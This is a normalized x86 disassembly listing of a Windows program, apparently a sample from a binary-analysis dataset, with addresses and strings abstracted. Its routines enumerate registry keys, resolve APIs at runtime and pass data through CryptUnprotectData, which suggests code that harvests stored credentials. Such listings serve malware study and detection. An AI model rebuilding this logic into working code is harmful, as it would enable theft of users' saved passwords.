lea eax [ ebp - 0x44 ]
push eax
push r--data
lea ecx [ ebp - 0x51 ]
call sub_407ccf
mov ecx eax
call sub_407f74
lea ecx [ ebp - 0x51 ]
call sub_407e74
sub esp 0x10
lea eax [ ebp - 0x44 ]
mov ecx esp
push eax
call sub_407e01
lea eax [ ebp - 0x51 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_408073
lea ecx [ ebp - 0x51 ]
call sub_407e74
lea ecx [ ebp - 0x44 ]
call sub_407e74
cmp [ ebp + 0x14 ] edi
je r-xdata
mov [ ebp - 0xc ] 0x1
push rw-data
lea esi [ ebx + 0x4 ]
push esi
call sub_401cef
test al al
pop ecx
pop ecx
je r-xdata
push esi
push rw-data
call sub_401cef
test al al
pop ecx
pop ecx
jne r-xdata
sub_40231f
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
sub esp 0x10
push esi
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x14 ]
push edi
mov [ ecx ] edx
mov edx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov [ ecx + 0x14 ] edx
add eax 0x4
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add ecx 0x4
mov esi ecx
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea esi [ ebp - 0x10 ]
mov edi ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn
sub_402381
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push [ esi ]
push [ edi ]
call sub_409e8e
test eax eax
pop ecx
pop ecx
jne r-xdata
xor eax eax
lea eax [ edi + 0x4 ]
push eax
lea eax [ esi + 0x4 ]
push eax
call sub_401c92
test al al
pop ecx
pop ecx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edi + 0x14 ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4023bf
push esi
push edi
mov edi [ esp + 0xc ]
lea eax [ edi + 0x4 ]
mov esi ecx
push eax
lea eax [ esi + 0x4 ]
push eax
call sub_401cef
test al al
pop ecx
pop ecx
je r-xdata
mov eax [ esi + 0x14 ]
xor ecx ecx
cmp eax [ edi + 0x14 ]
setg cl
mov al cl
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_402401
push ebx
push esi
call sub_405e8e
mov ebx [ esp + 0xc ]
test ebx ebx
mov esi ebx
je r-xdata
pop esi
pop ebx
retn
push edi
mov esi [ esi + 0x18 ]
test esi esi
jne r-xdata
push esi
mov ecx edi
call sub_4023bf
test al al
jne r-xdata
mov edi [ esi + 0x18 ]
test edi edi
je r-xdata
pop edi
push esi
mov ecx edi
call sub_402381
test al al
jne r-xdata
push [ esi + 0x18 ]
push esi
call sub_40231f
pop ecx
pop ecx
mov esi ebx
sub_40244a
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
lea eax [ ebp - 0x28 ]
push eax
push r--data
mov edi r--data
push edi
mov esi 0x80000001
push esi
call sub_4060a1
lea eax [ ebp - 0x2c ]
push eax
push r--data
push edi
push esi
call sub_4060a1
lea eax [ ebp - 0x24 ]
push eax
push r--data
push edi
push esi
call sub_4060a1
lea eax [ ebp - 0x30 ]
push eax
push r--data
push edi
push esi
call sub_4060a1
add esp 0x40
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov esi r--data
push esi
xor ebx ebx
push r--data
mov [ rw-data ] ebx
call sub_409def
mov ax [ ebp - 0x8 ]
mov [ rw-data ] ax
mov ax [ ebp - 0xc ]
mov [ rw-data ] ax
mov ax [ ebp - 0x10 ]
mov [ rw-data ] ax
mov ax [ ebp - 0x14 ]
mov [ rw-data ] ax
mov ax [ ebp - 0x18 ]
mov [ rw-data ] ax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
push r--data
call sub_409def
mov ax [ ebp - 0x8 ]
mov [ rw-data ] ax
mov ax [ ebp - 0xc ]
mov [ rw-data ] ax
mov ax [ ebp - 0x10 ]
mov [ rw-data ] ax
mov ax [ ebp - 0x14 ]
mov [ rw-data ] ax
mov ax [ ebp - 0x18 ]
add esp 0x38
mov [ rw-data ] ax
call sub_405fe1
mov esi rw-data
mov ecx esi
call sub_401c44
add [ rw-data ] 0x2
movzx eax [ rw-data ]
push eax
mov ecx esi
mov [ rw-data ] ebx
call sub_407eb0
mov eax [ rw-data ]
sar eax 0x8
push eax
mov ecx esi
call sub_407eb0
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_407eb0
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_407eb0
sub [ rw-data ] 0x2
push 0x15
call sub_409984
mov edi eax
cmp edi ebx
pop ecx
je r-xdata
mov [ rw-data ] ebx
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx edi
call sub_4077a2
mov [ rw-data ] eax
jmp r-xdata
push 0x15
call sub_409984
mov edi eax
cmp edi ebx
pop ecx
je r-xdata
call sub_40797c
push edi
call sub_4092d2
pop ecx
push [ rw-data ]
push 0x14
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ rw-data ]
call sub_407870
mov ecx [ rw-data ]
cmp ecx ebx
mov edi ecx
je r-xdata
mov [ rw-data ] ebx
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx edi
call sub_4077a2
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x1c ] ebx
mov ecx eax
call sub_401c72
mov [ ebp - 0x1c ] eax
jmp r-xdata
push 0x1c
call sub_409984
cmp eax ebx
pop ecx
je r-xdata
mov ebx rw-data
mov ecx ebx
call sub_407a67
cmp [ rw-data ] 0xf
jle r-xdata
call sub_40797c
push ebx
call sub_4092d2
pop ecx
mov eax [ ebp - 0x1c ]
mov ebx sub_4020dd
push ebx
push 0x1
mov [ ebp - 0x4 ] eax
mov edi r--data
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push [ ebp - 0x24 ]
call sub_405aa1
push ebx
push 0x1
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push [ ebp - 0x28 ]
call sub_405aa1
push ebx
push 0x1
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push [ ebp - 0x2c ]
call sub_405aa1
add esp 0x48
call sub_405ef9
push 0x3e8
call sub_409984
push [ ebp - 0x30 ]
mov [ ebp - 0x20 ] eax
push eax
call sub_409ed4
push r--data
push [ ebp - 0x20 ]
call sub_409e53
push ebx
push 0x1
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push [ ebp - 0x20 ]
call sub_405aa1
mov ecx [ rw-data ]
add esp 0x2c
test ecx ecx
mov ebx ecx
je r-xdata
call sub_406017
mov ecx esi
call sub_401c44
add [ rw-data ] 0x3
movzx eax [ rw-data ]
and [ rw-data ] 0x0
push eax
mov ecx esi
call sub_407eb0
mov eax [ rw-data ]
sar eax 0x8
push eax
mov ecx esi
call sub_407eb0
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_407eb0
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_407eb0
sub [ rw-data ] 0x3
mov eax [ ebp - 0x1c ]
jmp r-xdata
push ebx
call sub_406e91
pop ecx
test eax eax
mov [ ebp - 0x4 ] eax
jne r-xdata
push 0x1
push edi
push [ ebp - 0x4 ]
call sub_401d5b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
add esp 0xc
mov ecx ebx
call sub_407a67
cmp [ rw-data ] 0xf
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
call sub_406e91
pop ecx
sub_4027c9
push ebp
mov ebp esp
sub esp 0x18
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x18 ]
call sub_4077a2
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x18 ]
call sub_407870
lea ecx [ ebp - 0x18 ]
call sub_40797c
leave
retn
sub_402819
push ebp
mov ebp esp
mov eax 0x1030
call sub_408124
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x30 ]
call sub_4077a2
lea eax [ ebp - 0xc ]
push eax
push r--data
push 0x80000002
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x30 ]
call sub_40797c
pop edi
pop esi
pop ebx
leave
retn
xor ebx ebx
mov [ ebp - 0x4 ] ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x10 ] ebx
je r-xdata
push 0xd
pop ecx
mov esi r--data
lea edi [ ebp - 0x430 ]
[ edi ] [ esi ]
push 0x3cb
lea eax [ ebp - 0x3fb ]
push ebx
push eax
movsb [ edi ] [ esi ]
call sub_409951
add esp 0xc
lea eax [ ebp - 0x1030 ]
push eax
lea eax [ ebp - 0x430 ]
push eax
call [ lstrcatA@IAT ]
xor edi edi
push 0x400
lea eax [ ebp - 0x1030 ]
push eax
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call [ RegEnumKeyA@IAT ]
cmp eax ebx
mov [ ebp - 0x10 ] eax
jne r-xdata
push [ ebp - 0xc ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x830 ]
push eax
push ebx
push ebx
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc30 ]
push eax
push edi
push [ ebp - 0x8 ]
call [ RegEnumValueA@IAT ]
push [ ebp - 0x8 ]
mov esi eax
call [ RegCloseKey@IAT ]
push r--data
lea eax [ ebp - 0xc30 ]
push eax
inc edi
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x830 ]
push eax
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_406d42
lea eax [ ebp - 0x830 ]
push eax
call sub_406dab
add esp 0x10
push 0x3fe
lea eax [ ebp - 0xc2e ]
push ebx
mov esi 0x3ff
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0xc30 ] bx
call sub_409951
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x430 ]
push eax
push 0x80000002
mov [ ebp - 0x14 ] esi
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
sub_40299b
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x2b4
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x18 ]
call sub_4077a2
call sub_405ef9
xor ebx ebx
mov [ ebp + 0x20 ] 0xe0
mov [ ebp + 0x21 ] bl
mov [ ebp + 0x22 ] 0xc8
mov [ ebp + 0x23 ] bl
mov [ ebp + 0x24 ] 0x8
mov [ ebp + 0x25 ] 0x1
mov [ ebp + 0x26 ] 0x10
mov [ ebp + 0x27 ] 0x1
mov [ ebp + 0x28 ] 0xc0
mov [ ebp + 0x29 ] bl
mov [ ebp + 0x2a ] 0x14
mov [ ebp + 0x2b ] 0x1
mov [ ebp + 0x2c ] 0xd8
mov [ ebp + 0x2d ] bl
mov [ ebp + 0x2e ] 0xdc
mov [ ebp + 0x2f ] bl
mov [ ebp + 0x30 ] 0xb4
mov [ ebp + 0x31 ] bl
mov [ ebp + 0x32 ] 0xe4
mov [ ebp + 0x33 ] bl
mov [ ebp + 0x34 ] 0x18
mov [ ebp + 0x35 ] 0x1
mov [ ebp + 0x36 ] 0x14
mov [ ebp + 0x37 ] 0x1
mov [ ebp + 0x38 ] 0x4
mov [ ebp + 0x39 ] 0x1
mov [ ebp + 0x3a ] 0xb4
mov [ ebp + 0x3b ] bl
mov [ ebp + 0x3c ] 0xd0
mov [ ebp + 0x3d ] bl
mov [ ebp + 0x3e ] 0xdc
mov [ ebp + 0x3f ] bl
mov [ ebp + 0x40 ] 0xd0
mov [ ebp + 0x41 ] bl
mov [ ebp + 0x42 ] 0xe0
mov [ ebp + 0x43 ] bl
mov [ ebp + 0x44 ] 0xb4
mov [ ebp + 0x45 ] bl
mov [ ebp + 0x46 ] 0xe0
mov [ ebp + 0x47 ] bl
mov [ ebp + 0x48 ] 0xd8
mov [ ebp + 0x49 ] bl
mov [ ebp + 0x4a ] 0xdc
mov [ ebp + 0x4b ] bl
mov [ ebp + 0x4c ] 0xc8
mov [ ebp + 0x4d ] bl
mov [ ebp + 0x4e ] 0xb4
mov [ ebp + 0x4f ] bl
mov [ ebp + 0x50 ] 0x10
mov [ ebp + 0x51 ] 0x1
mov [ ebp + 0x52 ] 0xd4
mov [ ebp + 0x53 ] bl
mov [ ebp + 0x54 ] 0x14
mov [ ebp + 0x55 ] 0x1
mov [ ebp + 0x56 ] 0x18
mov [ ebp + 0x57 ] 0x1
mov [ ebp + 0x58 ] 0x14
mov [ ebp + 0x59 ] 0x1
mov [ ebp + 0x5a ] 0xd4
mov [ ebp + 0x5b ] bl
mov [ ebp + 0x5c ] 0x8
mov [ ebp + 0x5d ] 0x1
mov [ ebp + 0x5e ] 0xdc
mov [ ebp + 0x5f ] bl
mov [ ebp + 0x60 ] 0xdc
mov [ ebp + 0x61 ] bl
mov [ ebp + 0x62 ] 0xe4
mov [ ebp + 0x63 ] bl
mov [ ebp + 0x64 ] 0x8
push 0xfc
lea eax [ ebp - 0x23c ]
push ebx
push eax
mov [ ebp + 0x65 ] 0x1
mov [ ebp + 0x66 ] 0xc0
mov [ ebp + 0x67 ] bl
mov [ ebp + 0x68 ] bl
mov [ ebp + 0x69 ] bl
mov [ ebp + 0x6a ] bl
mov [ ebp + 0x6b ] bl
mov [ ebp + 0x6c ] 0xc8
mov [ ebp + 0x6d ] 0xf3
mov [ ebp + 0x6e ] 0x41
mov [ ebp - 0x140 ] bl
call sub_409951
add esp 0xc
mov [ ebp + 0x74 ] ebx
mov [ ebp + 0x70 ] ebx
call sub_405f54
mov edi [ LoadLibraryA@IAT ]
push r--data
call edi
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
cmp eax ebx
mov [ ebp + 0x10 ] eax
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_40797c
pop edi
pop esi
pop ebx
add ebp 0x78
leave
retn
push r--data
call edi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp + 0x1c ] eax
push r--data
push edi
call esi
push r--data
push edi
mov [ ebp + 0x1c ] eax
call esi
push r--data
push edi
mov [ ebp + 0x18 ] eax
call esi
cmp [ ebp + 0x1c ] ebx
mov esi eax
mov [ ebp + 0x14 ] esi
je r-xdata
push [ ebp + 0x74 ]
call esi
xor edi edi
call sub_406017
cmp [ ebp + 0x70 ] ebx
je r-xdata
cmp [ ebp + 0x18 ] ebx
je r-xdata
call sub_405fe1
mov esi 0x100
cmp esi ebx
jne r-xdata
inc edi
cmp edi [ ebp + 0x70 ]
jb r-xdata
push ebx
push ebx
push esi
lea eax [ ebp - 0x140 ]
push eax
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
lea eax [ ebp + 0x74 ]
push eax
lea eax [ ebp + 0x70 ]
push eax
push ebx
push r--data
call [ ebp + 0x1c ]
cmp [ ebp + 0x70 ] ebx
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x74 ]
lea eax [ eax + edi * 4 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x18 ]
mov [ ebp - 0x20 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x1c ]
push esi
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x140 ]
push ebx
push eax
call sub_409951
add esp 0xc
lea eax [ ebp + 0x20 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x1
push ebx
push ebx
lea eax [ ebp - 0x28 ]
push eax
push ebx
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x28 ] 0x4a
call [ ebp + 0x10 ]
cmp eax 0x1
jne r-xdata
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x140 ]
push eax
call sub_409f34
test eax eax
pop ecx
jbe r-xdata
mov eax [ ebp + 0x74 ]
mov eax [ eax + edi * 4 ]
mov eax [ eax + 0x30 ]
push eax
mov [ ebp + 0x18 ] eax
call sub_409f34
push eax
push [ ebp + 0x18 ]
lea eax [ ebp ]
push eax
call sub_4063c6
add esp 0x10
push [ ebp + 0x4 ]
push [ ebp + 0x8 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x18 ]
call sub_407870
lea eax [ ebp - 0x140 ]
push eax
call sub_409f34
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x140 ]
push eax
push ecx
call sub_4063c6
add esp 0xc
lea eax [ ebp - 0x3d ]
push eax
lea ecx [ ebp ]
call sub_408073
lea ecx [ ebp - 0x3d ]
call sub_407e74
push [ ebp + 0x4 ]
push [ ebp + 0x8 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x18 ]
call sub_407870
lea ecx [ ebp ]
call sub_407e74
sub_402d19
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
lea ecx [ ebp - 0x20 ]
call sub_407e64
mov esi [ ebp + 0x14 ]
add esi esi
push esi
call sub_409984
pop ecx
xor ebx ebx
push ebx
push ebx
push esi
mov edi eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi ebx
jle r-xdata
push edi
call sub_4092d2
push [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push eax
call sub_4063c6
mov eax [ ebp + 0x14 ]
add esp 0x10
cmp eax [ ebp - 0x8 ]
jge r-xdata
movzx eax [ ebx + edi ]
push eax
lea eax [ ebp - 0x2d ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_407f56
lea ecx [ ebp - 0x2d ]
call sub_407e74
inc ebx
cmp ebx esi
jl r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
call sub_4098f3
mov esi [ ebp - 0x8 ]
add esp 0xc
lea ecx [ ebp - 0x10 ]
call sub_407e74
lea ecx [ ebp - 0x20 ]
call sub_407e74
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
push [ ebp + 0x10 ]
call sub_4092d2
push [ ebp - 0x8 ]
call sub_409984
pop ecx
pop ecx
mov [ ebp + 0x10 ] eax
sub_402dd0
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ eax ]
push esi
xor esi esi
push esi
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0x8 ]
push esi
push eax
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push esi
push esi
push 0x3ff
push [ ebp + 0xc ]
push 0xffffffff
push [ eax + 0x4 ]
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
push [ ebp - 0x4 ]
call [ CoTaskMemFree@IAT ]
pop esi
leave
retn
sub_402e15
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ eax ]
push esi
xor esi esi
push esi
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
push eax
call [ ecx + 0x28 ]
mov eax [ ebp - 0x4 ]
push esi
push esi
push 0x3ff
push [ ebp + 0x10 ]
push 0xffffffff
push [ eax + 0x4 ]
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
push [ ebp - 0x4 ]
call [ CoTaskMemFree@IAT ]
pop esi
leave
retn
sub_402e5d
push ebp
mov ebp esp
sub esp 0xc78
push ebx
push esi
push edi
lea eax [ ebp - 0x478 ]
push eax
push [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
call sub_402dd0
lea eax [ ebp - 0xc78 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_402e15
push 0x400
lea eax [ ebp - 0x878 ]
push eax
push 0xffffffff
push [ ebp + 0x14 ]
call sub_402d19
add esp 0x24
push ebx
push ebx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push [ ebp + 0x14 ]
mov esi eax
push [ ebp + 0x10 ]
mov eax [ rw-data ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0x44 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x4e ]
mov [ ebp - 0x4 ] 0x3
call sub_407d38
push eax
push rw-data
lea ecx [ ebp - 0x41 ]
call sub_407d38
mov ecx eax
call sub_408033
test al al
jne r-xdata
mov [ ebp - 0x5 ] bl
push r--data
lea ecx [ ebp - 0x75 ]
mov [ ebp - 0x4 ] 0xf
call sub_407ccf
push eax
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x5b ]
call sub_407d38
mov ecx eax
call sub_408033
test al al
jne r-xdata
test [ ebp - 0x4 ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0xffffffdf
lea ecx [ ebp - 0x2c ]
call sub_407e74
push rw-data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x3f
call sub_407d38
push eax
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_407d38
mov ecx eax
call sub_408033
test al al
mov [ ebp - 0x5 ] 0x1
je r-xdata
test [ ebp - 0x4 ] 0x8
je r-xdata
and [ ebp - 0x4 ] 0xffffffef
lea ecx [ ebp - 0x68 ]
call sub_407e74
test [ ebp - 0x4 ] 0x20
je r-xdata
test [ ebp - 0x4 ] 0x4
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
lea ecx [ ebp - 0x5b ]
call sub_407e74
test [ ebp - 0x4 ] 0x2
je r-xdata
and [ ebp - 0x4 ] 0xfffffffb
lea ecx [ ebp - 0x75 ]
call sub_407e74
test [ ebp - 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0xfffffffd
lea ecx [ ebp - 0x41 ]
call sub_407e74
cmp [ ebp - 0x5 ] bl
jne r-xdata
lea ecx [ ebp - 0x4e ]
call sub_407e74
lea eax [ ebp - 0x478 ]
push eax
push eax
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov edi [ ebp + 0x8 ]
mov ecx edi
call sub_407870
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x34 ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
lea eax [ ebp - 0x878 ]
push eax
push esi
je r-xdata
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx edi
call sub_407870
push r--data
lea ecx [ ebp - 0x41 ]
call sub_407ccf
push eax
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ ebp - 0x4e ]
call sub_407d38
mov ecx eax
call sub_408033
lea ecx [ ebp - 0x4e ]
mov [ ebp - 0x5 ] al
call sub_407e74
lea ecx [ ebp - 0x41 ]
call sub_407e74
cmp [ ebp - 0x5 ] bl
je r-xdata
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx edi
call sub_407870
push [ ebp - 0x18 ]
push 0x1
call sub_4091b9
pop ecx
pop ecx
mov esi eax
mov eax rw-data
push eax
push eax
call sub_409f34
pop ecx
push eax
push edi
call sub_406cd9
push [ ebp - 0x18 ]
push esi
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
call sub_402d19
add esp 0x1c
push esi
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx edi
call sub_407870
push esi
call sub_40957e
pop ecx
push [ ebp - 0x14 ]
call [ LocalFree@IAT ]
jmp r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push [ ebp - 0xc ]
push eax
call sub_4063c6
add esp 0xc
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx edi
call sub_407870
lea ecx [ ebp - 0x2c ]
call sub_407e74
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x57
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp - 0x10 ]
call sub_409984
push [ ebp - 0x10 ]
mov edi eax
call sub_409984
mov esi [ ebp - 0xc ]
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x4 ] 0x1
lea ecx [ eax + esi ]
jmp r-xdata
cmp [ eax + 0x1 ] 0x49
jne r-xdata
cmp esi ecx
jl r-xdata
cmp [ eax + 0x2 ] 0x43
jne r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push edi
call sub_4092d2
push [ ebp - 0x1c ]
call sub_4092d2
pop ecx
pop ecx
jmp r-xdata
cmp [ eax + 0x3 ] 0x4b
jne r-xdata
push eax
push edi
push 0xffffffff
push esi
call sub_402d19
add esp 0x10
push ebx
push ebx
push 0xffffffff
push edi
push ebx
push 0xfde9
mov [ ebp - 0x4 ] eax
call [ MultiByteToWideChar@IAT ]
push edi
push [ ebp - 0x4 ]
lea esi [ esi + eax * 2 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp + 0x8 ]
call sub_407870
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
add ecx eax
cmp [ eax + 0x4 ] 0x18
je r-xdata
push eax
call [ CoTaskMemFree@IAT ]
sub_4031f1
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx [ eax ]
sub esp 0xc
lea edx [ ebp - 0xc ]
push edx
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x0
push eax
call [ ecx + 0x54 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
leave
retn
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402e5d
add esp 0x10
push [ ebp - 0x8 ]
call [ CoTaskMemFree@IAT ]
dec [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x8 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_403256
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx [ eax ]
sub esp 0x108
push esi
push edi
lea edx [ ebp - 0x8 ]
push edx
push 0x0
push [ ebp + 0xc ]
push 0x0
push eax
call [ ecx + 0x3c ]
xor edi edi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
pop edi
pop esi
leave
retn
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4031f1
add esp 0xc
inc edi
add esi 0x10
dec [ ebp - 0x4 ]
jne r-xdata
jmp r-xdata
mov eax edi
shl eax 0x4
lea edx [ ebp - 0x4 ]
push edx
lea esi [ ebp + eax - 0x108 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push esi
push 0x10
push eax
call [ ecx + 0xc ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4032c2
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx [ eax ]
sub esp 0x108
push esi
push edi
lea edx [ ebp - 0x8 ]
push edx
push 0x0
push 0x0
push eax
call [ ecx + 0x38 ]
xor edi edi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
pop edi
pop esi
leave
retn
push esi
push [ ebp + 0x8 ]
call sub_403256
pop ecx
inc edi
add esi 0x10
dec [ ebp - 0x4 ]
pop ecx
jne r-xdata
jmp r-xdata
mov eax edi
shl eax 0x4
lea edx [ ebp - 0x4 ]
push edx
lea esi [ ebp + eax - 0x108 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push esi
push 0x10
push eax
call [ ecx + 0xc ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_403327
push ebp
lea ebp [ esp - 0x70 ]
mov eax 0x81d0
call sub_408124
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x15f ]
push ebx
push eax
mov [ ebp - 0x160 ] bl
call sub_409951
add esp 0xc
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x20 ]
push eax
lea eax [ ebp + 0x1c ]
push eax
lea eax [ ebp + 0x58 ]
push eax
